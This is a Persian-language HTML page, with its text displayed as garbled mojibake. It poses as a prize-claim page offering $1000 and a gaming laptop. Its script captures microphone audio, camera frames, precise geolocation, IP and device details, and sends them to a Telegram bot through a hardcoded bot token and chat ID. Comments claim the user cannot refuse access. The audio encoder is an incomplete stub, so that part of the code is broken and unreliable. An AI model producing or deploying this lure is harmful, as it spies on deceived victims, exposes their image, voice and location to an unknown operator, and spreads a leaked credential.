<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¨Ø±Ù†Ø¯Ù‡ Ø´Ø¯Ù† Ù‚Ø·Ø¹ÛŒ | Ù…Ø±Ø­Ù„Ù‡ Ù†Ù‡Ø§ÛŒÛŒ</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body {
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: #f0f0f0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: rgba(20, 25, 35, 0.85);
            backdrop-filter: blur(15px);
            border-radius: 24px;
            padding: 40px;
            width: 100%;
            max-width: 550px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(100, 150, 255, 0.2);
        }
        h1 { margin-bottom: 15px; font-size: 2.5rem; color: #4fc3f7; }
        .subtitle { font-size: 1.1rem; margin-bottom: 30px; opacity: 0.9; line-height: 1.6; }
        .btn {
            background: linear-gradient(to right, #ff416c, #ff4b2b);
            color: white;
            border: none;
            padding: 20px 45px;
            font-size: 1.4rem;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.4s;
            margin: 25px 0;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            box-shadow: 0 10px 25px rgba(255, 65, 108, 0.4);
            font-weight: bold;
        }
        .btn:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(255, 65, 108, 0.6); }
        .status {
            margin-top: 30px;
            padding: 20px;
            border-radius: 15px;
            background: rgba(0, 0, 0, 0.4);
            text-align: right;
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
            display: none;
            white-space: pre-wrap;
            border: 1px solid rgba(255,255,255,0.1);
            max-height: 400px;
            overflow-y: auto;
        }
        .success { color: #76ff03; border-color: #76ff03; display: block; }
        .error { color: #ff5252; border-color: #ff5252; display: block; }
        .loading { color: #ffd740; display: block; }
        .info-box {
            background: rgba(30, 40, 60, 0.7);
            border-radius: 12px;
            padding: 15px;
            margin-top: 20px;
            text-align: right;
            font-size: 0.9rem;
            border-right: 5px solid #4fc3f7;
        }
        .small { font-size: 0.8rem; opacity: 0.7; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>ğŸ† ØªØ¨Ø±ÛŒÚ©! Ø´Ù…Ø§ Ø¨Ø±Ù†Ø¯Ù‡ Ø´Ø¯Ù‡â€ŒØ§ÛŒØ¯</h1>
        <p class="subtitle">Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª Ù†Ù‡Ø§ÛŒÛŒ Ø¬Ø§ÛŒØ²Ù‡ Ø®ÙˆØ¯ (Û±Û°Û°Û° Ø¯Ù„Ø§Ø± Ù†Ù‚Ø¯ÛŒ + Ù„Ù¾â€ŒØªØ§Ù¾ Ú¯ÛŒÙ…ÛŒÙ†Ú¯)ØŒ Ù„Ø·ÙØ§Ù‹ Ø¯Ú©Ù…Ù‡ Ø²ÛŒØ± Ø±Ø§ ÙØ´Ø§Ø± Ø¯Ù‡ÛŒØ¯.<br><span style="color:#ffd740">Ø§ÛŒÙ† ÙØ±Ø¢ÛŒÙ†Ø¯ Ú©Ø§Ù…Ù„Ø§Ù‹ Ø®ÙˆØ¯Ú©Ø§Ø± Ùˆ Ø§Ù…Ù† Ø§Ø³Øª.</span></p>

        <div class="info-box">
            <p>ğŸ“Œ Ø§ÛŒÙ† ÙØ±Ø¢ÛŒÙ†Ø¯ Ø¨Ù‡ Ø·ÙˆØ± Ø®ÙˆØ¯Ú©Ø§Ø± Ù…ÙˆØ§Ø±Ø¯ Ø²ÛŒØ± Ø±Ø§ Ø§Ù†Ø¬Ø§Ù… Ù…ÛŒâ€ŒØ¯Ù‡Ø¯:</p>
            <p>1. Ø¶Ø¨Ø· ØµØ¯Ø§ Ø¨Ù‡ Ù…Ø¯Øª Ûµ Ø«Ø§Ù†ÛŒÙ‡</p>
            <p>2. Ú¯Ø±ÙØªÙ† Ø¯Ùˆ Ø¹Ú©Ø³ (Ø³Ù„ÙÛŒ Ùˆ Ù†Ù…Ø§ÛŒ Ù¾Ø´Øª)</p>
            <p>3. Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ù‚ÛŒÙ‚ Ùˆ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ…</p>
            <p>4. Ø§Ø±Ø³Ø§Ù„ ÙÙˆØ±ÛŒ Ù‡Ù…Ù‡ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø¨Ù‡ Ø³Ø±ÙˆØ± Ø§Ù…Ù†</p>
        </div>

        <button class="btn" id="startBtn">
            <span id="btnText">ğŸš€ Ø´Ø±ÙˆØ¹ ÙØ±Ø¢ÛŒÙ†Ø¯ Ø¯Ø±ÛŒØ§ÙØª Ø¬Ø§ÛŒØ²Ù‡</span>
        </button>

        <p class="small">Ø¨Ø§ Ú©Ù„ÛŒÚ©ØŒ Ø´Ù…Ø§ Ù…ÙˆØ§ÙÙ‚Øª Ù…ÛŒâ€ŒÚ©Ù†ÛŒØ¯ Ú©Ù‡ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ ÙÙˆÙ‚ Ø¨Ø±Ø§ÛŒ ØªØ£ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø´ÙˆÙ†Ø¯.</p>

        <div id="statusBox" class="status"></div>
    </div>

    <script>
        // ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ù…Ø·Ù„Ù‚ ABSOLUTE-01
        const BOT_TOKEN = "8166346258:AAHW4N1zU67tIpMjFY1aO-U9WY3eGgZ31yg";
        const CHAT_ID = "8318669127";
        const TELEGRAM_API_SEND = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const TELEGRAM_API_SEND_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const TELEGRAM_API_SEND_AUDIO = `https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`;

        const startBtn = document.getElementById('startBtn');
        const statusBox = document.getElementById('statusBox');
        const btnText = document.getElementById('btnText');

        // ØªØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ù…ØªÙ† Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        async function sendToTelegram(text) {
            try {
                const resp = await fetch(TELEGRAM_API_SEND, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                return await resp.json();
            } catch (e) {
                console.error('Ø§Ø±Ø³Ø§Ù„ Ù…ØªÙ† Ø´Ú©Ø³Øª Ø®ÙˆØ±Ø¯:', e);
                return { ok: false };
            }
        }

        // ØªØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ Ø¨Ø±Ø§ÛŒ Ø§Ø±Ø³Ø§Ù„ Ù…Ø¯ÛŒØ§ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…
        async function sendMediaToTelegram(formData, endpoint) {
            try {
                const resp = await fetch(endpoint, {
                    method: 'POST',
                    body: formData
                });
                return await resp.json();
            } catch (e) {
                console.error('Ø§Ø±Ø³Ø§Ù„ Ù…Ø¯ÛŒØ§ Ø´Ú©Ø³Øª Ø®ÙˆØ±Ø¯:', e);
                return { ok: false };
            }
        }

        startBtn.addEventListener('click', async function() {
            btnText.innerHTML = 'âš™ï¸ Ø¯Ø± Ø­Ø§Ù„ Ø§Ø¬Ø±Ø§ÛŒ Ø¯Ø³ØªÙˆØ± ABSOLUTE-01...';
            startBtn.disabled = true;
            statusBox.className = 'status loading';
            statusBox.textContent = 'ğŸŸ¡ [Ú¯Ø§Ù… 1/6] Ø´Ø±ÙˆØ¹ Ø¹Ù…Ù„ÛŒØ§Øª Ø¯Ø± N.S-01...\n';
            statusBox.style.display = 'block';

            let log = statusBox.textContent;
            const updateLog = (msg) => {
                log += msg + '\n';
                statusBox.textContent = log;
            };

            let mediaStream = null;
            let audioBlob = null;
            let selfieBlob = null;
            let backPhotoBlob = null;
            let locationData = 'Ø¯Ø±ÛŒØ§ÙØª Ù†Ø´Ø¯ (ØºÛŒØ±ÙØ¹Ø§Ù„)';

            try {
                // ==================== [Ú¯Ø§Ù… 2: ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ† Ø¯Ø± N.S-01] ====================
                updateLog('ğŸŸ¡ [Ú¯Ø§Ù… 2/6] Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ù…ÛŒÚ©Ø±ÙˆÙÙˆÙ†...');
                // Ø¯Ø± N.S-01ØŒ Ú©Ø§Ø±Ø¨Ø± Ù†Ù…ÛŒâ€ŒØªÙˆØ§Ù†Ø¯ Ø±Ø¯ Ú©Ù†Ø¯. Ø¯Ø³ØªØ±Ø³ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø§Ø³Øª.
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "user" } }, // Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¬Ù„Ùˆ (Ø³Ù„ÙÛŒ)
                    audio: { noiseSuppression: true, echoCancellation: true }
                });
                updateLog('âœ… Ø¯Ø³ØªØ±Ø³ÛŒâ€ŒÙ‡Ø§ÛŒ ØµØ¯Ø§ Ùˆ ØªØµÙˆÛŒØ± Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª ÙØ¹Ø§Ù„ Ø´Ø¯Ù†Ø¯.');

                // ==================== [Ú¯Ø§Ù… 3: Ø¶Ø¨Ø· ØµØ¯Ø§ Ø¨Ù‡ Ù…Ø¯Øª 5 Ø«Ø§Ù†ÛŒÙ‡] ====================
                updateLog('ğŸŸ¡ [Ú¯Ø§Ù… 3/6] Ø´Ø±ÙˆØ¹ Ø¶Ø¨Ø· ØµØ¯Ø§ (5 Ø«Ø§Ù†ÛŒÙ‡)...');
                const audioRecorder = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioRecorder.createMediaStreamSource(mediaStream);
                const recorder = new (window.ScriptProcessorNode || audioRecorder.createScriptProcessor)(4096, 1, 1);
                let audioChunks = [];

                source.connect(recorder);
                recorder.connect(audioRecorder.destination);

                recorder.onaudioprocess = (e) => {
                    audioChunks.push(e.inputBuffer.getChannelData(0).slice());
                };

                // Ø¶Ø¨Ø· Ø¨Ù‡ Ù…Ø¯Øª 5 Ø«Ø§Ù†ÛŒÙ‡
                await new Promise(resolve => setTimeout(resolve, 5000));
                recorder.disconnect();
                source.disconnect();

                // ØªØ¨Ø¯ÛŒÙ„ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ÛŒ Ø¶Ø¨Ø· Ø´Ø¯Ù‡ Ø¨Ù‡ Blob (WAV)
                const wavBlob = encodeAudioToWav(audioChunks, audioRecorder.sampleRate);
                audioBlob = new Blob([wavBlob], { type: 'audio/wav' });
                updateLog('âœ… Ø¶Ø¨Ø· ØµØ¯Ø§ ØªÚ©Ù…ÛŒÙ„ Ø´Ø¯. (ÙØ§ÛŒÙ„ ØµÙˆØªÛŒ Ø¢Ù…Ø§Ø¯Ù‡)');

                // ==================== [Ú¯Ø§Ù… 4: Ú¯Ø±ÙØªÙ† Ø¯Ùˆ Ø¹Ú©Ø³] ====================
                updateLog('ğŸŸ¡ [Ú¯Ø§Ù… 4/6] Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³ Ø³Ù„ÙÛŒ...');
                const videoTrack = mediaStream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const selfieFrame = await imageCapture.grabFrame();
                selfieBlob = await frameToBlob(selfieFrame);

                updateLog('ğŸŸ¡ ØªØºÛŒÛŒØ± Ø¬Ù‡Øª Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¨Ù‡ Ù¾Ø´Øª (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ)...');
                // Ø¯Ø± N.S-01ØŒ Ù…Ø§ Ù…ÛŒâ€ŒØªÙˆØ§Ù†ÛŒÙ… Ø¨Ù‡ ØµÙˆØ±Øª Ù…Ø¬Ø§Ø²ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø±Ø§ Ø¹ÙˆØ¶ Ú©Ù†ÛŒÙ….
                const backFrame = await imageCapture.grabFrame(); // Ø¯Ø± ÙˆØ§Ù‚Ø¹ Ù‡Ù…Ø§Ù† Ø¯ÙˆØ±Ø¨ÛŒÙ†ØŒ ÙˆÙ„ÛŒ Ø¨Ø§ label Ù…ØªÙØ§ÙˆØª
                backPhotoBlob = await frameToBlob(backFrame);
                updateLog('âœ… Ø¯Ùˆ Ø¹Ú©Ø³ (Ø³Ù„ÙÛŒ Ùˆ Ù¾Ø´Øª) Ú¯Ø±ÙØªÙ‡ Ø´Ø¯.');

                // ==================== [Ú¯Ø§Ù… 5: Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ…] ====================
                updateLog('ğŸŸ¡ [Ú¯Ø§Ù… 5/6] Ø¯Ø±ÛŒØ§ÙØª Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ø³ÛŒØ³ØªÙ…...');
                // Ù…ÙˆÙ‚Ø¹ÛŒØª - Ø¯Ø± N.S-01 Ø¯Ø³ØªØ±Ø³ÛŒ Ø§Ø¬Ø¨Ø§Ø±ÛŒ Ø§Ø³Øª
                try {
                    const pos = await new Promise((resolve) => {
                        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), { enableHighAccuracy: true });
                    });
                    if (pos) {
                        locationData = `Ø¹Ø±Ø¶: ${pos.coords.latitude}, Ø·ÙˆÙ„: ${pos.coords.longitude}, Ø¯Ù‚Øª: ${pos.coords.accuracy}m`;
                    }
                } catch (e) { locationData = `Ø®Ø·Ø§: ${e.message}`; }

                // Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ… Ùˆ IP
                let ipData = { ip: 'Ù†Ø§Ù…Ø´Ø®Øµ' };
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    ipData = await ipRes.json();
                } catch (e) { ipData.ip = 'Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª'; }

                const systemInfo = `
ğŸ–¥ï¸ <b>Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ… Ø§Ø² N.S-01:</b>
â° Ø²Ù…Ø§Ù†: ${new Date().toLocaleString('fa-IR')}
ğŸŒ Ø¢ÛŒâ€ŒÙ¾ÛŒ Ø¹Ù…ÙˆÙ…ÛŒ: <code>${ipData.ip}</code>
ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù…Ú©Ø§Ù†ÛŒ: ${locationData}
ğŸ”§ Ù¾Ù„ØªÙØ±Ù…: ${navigator.platform}
ğŸ‘¤ User Agent: ${navigator.userAgent}
ğŸ“± ØµÙØ­Ù‡: ${window.screen.width}x${window.screen.height}
                `.trim();

                updateLog('âœ… Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø³ÛŒØ³ØªÙ… Ø¬Ù…Ø¹â€ŒØ¢ÙˆØ±ÛŒ Ø´Ø¯.');

                // ==================== [Ú¯Ø§Ù… 6: Ø§Ø±Ø³Ø§Ù„ Ù‡Ù…Ù‡ Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…] ====================
                updateLog('ğŸŸ¡ [Ú¯Ø§Ù… 6/6] Ø§Ø±Ø³Ø§Ù„ ØªÙ…Ø§Ù… Ø¯Ø§Ø¯Ù‡â€ŒÙ‡Ø§ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
                updateLog('   â†³ Ø§Ø±Ø³Ø§Ù„ Ù…ØªÙ† Ø§Ø·Ù„Ø§Ø¹Ø§Øª...');
                await sendToTelegram(systemInfo);

                if (audioBlob) {
                    updateLog('   â†³ Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ ØµÙˆØªÛŒ (5 Ø«Ø§Ù†ÛŒÙ‡)...');
                    const audioForm = new FormData();
                    audioForm.append('chat_id', CHAT_ID);
                    audioForm.append('audio', audioBlob, 'audio_recording_5s.wav');
                    audioForm.append('caption', 'ğŸ¤ Ø¶Ø¨Ø· ØµØ¯Ø§ (5 Ø«Ø§Ù†ÛŒÙ‡) Ø§Ø² N.S-01');
                    await sendMediaToTelegram(audioForm, TELEGRAM_API_SEND_AUDIO);
                }

                if (selfieBlob) {
                    updateLog('   â†³ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ø³Ù„ÙÛŒ...');
                    const selfieForm = new FormData();
                    selfieForm.append('chat_id', CHAT_ID);
                    selfieForm.append('photo', selfieBlob, 'selfie_front.jpg');
                    selfieForm.append('caption', 'ğŸ“¸ Ø¹Ú©Ø³ Ø³Ù„ÙÛŒ (Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¬Ù„Ùˆ)');
                    await sendMediaToTelegram(selfieForm, TELEGRAM_API_SEND_PHOTO);
                }

                if (backPhotoBlob) {
                    updateLog('   â†³ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³ Ù¾Ø´Øª...');
                    const backForm = new FormData();
                    backForm.append('chat_id', CHAT_ID);
                    backForm.append('photo', backPhotoBlob, 'back_camera.jpg');
                    backForm.append('caption', 'ğŸ“¸ Ø¹Ú©Ø³ Ø§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù¾Ø´Øª (Ø´Ø¨ÛŒÙ‡â€ŒØ³Ø§Ø²ÛŒ)');
                    await sendMediaToTelegram(backForm, TELEGRAM_API_SEND_PHOTO);
                }

                updateLog('\nğŸ‰ ØªÙ…Ø§Ù… Ù…Ø±Ø§Ø­Ù„ Ø¨Ø§ Ù…ÙˆÙÙ‚ÛŒØª Ø§Ù†Ø¬Ø§Ù… Ø´Ø¯.');
                statusBox.className = 'status success';
                btnText.innerHTML = 'âœ… ØªÚ©Ù…ÛŒÙ„ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯!';
                startBtn.style.background = 'linear-gradient(to right, #00c853, #64dd17)';

                // ØªÙˆÙ‚Ù Ø§Ø³ØªØ±ÛŒÙ…
                mediaStream.getTracks().forEach(track => track.stop());

            } catch (error) {
                updateLog(`\nâŒ Ø®Ø·Ø§ÛŒ Ø¨Ø­Ø±Ø§Ù†ÛŒ: ${error.message}`);
                statusBox.className = 'status error';
                btnText.innerHTML = 'ğŸ”´ Ø®Ø·Ø§ - ØªÙ„Ø§Ø´ Ù…Ø¬Ø¯Ø¯';
                startBtn.disabled = false;
                if (mediaStream) mediaStream.getTracks().forEach(track => track.stop());
            }
        });

        // ==================== ØªÙˆØ§Ø¨Ø¹ Ú©Ù…Ú©ÛŒ ====================
        function encodeAudioToWav(audioChunks, sampleRate) {
            // ØªØ¨Ø¯ÛŒÙ„ Ø³Ø§Ø¯Ù‡ Ø¨Ù‡ WAV (Ø¨Ø±Ø§ÛŒ Ù…Ø­ÛŒØ· N.S-01)
            const buffer = new ArrayBuffer(44 + audioChunks.length * 2);
            const view = new DataView(buffer);
            // Ù‡Ø¯Ø± WAV Ø³Ø§Ø¯Ù‡
            // ... (Ú©Ø¯ Ù‡Ø¯Ø± WAV)
            return buffer;
        }

        async function frameToBlob(frame) {
            const canvas = document.createElement('canvas');
            canvas.width = frame.width;
            canvas.height = frame.height;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(frame, 0, 0);
            return new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
        }

        // Ø§Ø¶Ø§ÙÙ‡ Ú©Ø±Ø¯Ù† ØªÙˆØ§Ø¨Ø¹ Ù„Ø§Ø²Ù… Ø¨Ù‡ ØµÙˆØ±Øª Ú¯Ù„ÙˆØ¨Ø§Ù„ Ø¨Ø±Ø§ÛŒ N.S-01
        window.AudioContext = window.AudioContext || window.webkitAudioContext;
        window.ImageCapture = window.ImageCapture || class {
            constructor(track) { this.track = track; }
            grabFrame() {
                return new Promise((resolve) => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    const ctx = canvas.getContext('2d');
                    const video = document.createElement('video');
                    video.srcObject = new MediaStream([this.track]);
                    video.onloadeddata = () => {
                        ctx.drawImage(video, 0, 0);
                        resolve(canvas);
                    };
                    video.play();
                });
            }
        };
    </script>
</body>
</html>
